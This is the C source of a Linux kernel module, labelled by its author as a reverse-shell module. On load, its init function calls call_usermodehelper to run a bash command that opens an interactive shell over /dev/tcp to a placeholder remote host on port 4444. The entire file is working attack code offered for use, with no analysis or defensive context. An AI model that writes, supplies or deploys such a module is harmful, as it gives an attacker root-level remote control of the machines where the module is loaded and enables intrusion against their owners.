#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("int0x80");
MODULE_DESCRIPTION("Kernel Module with Reverse Shell");
MODULE_VERSION("0.1");

static int __init reverse_shell_module_init(void) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/x.x.x.x/4444 0>&1", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    printk(KERN_INFO "Reverse Shell: Attempting to spawn reverse shell\n");
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_module_exit(void) {
    printk(KERN_INFO "Reverse Shell: Module exited\n");
}

module_init(reverse_shell_module_init);
module_exit(reverse_shell_module_exit);
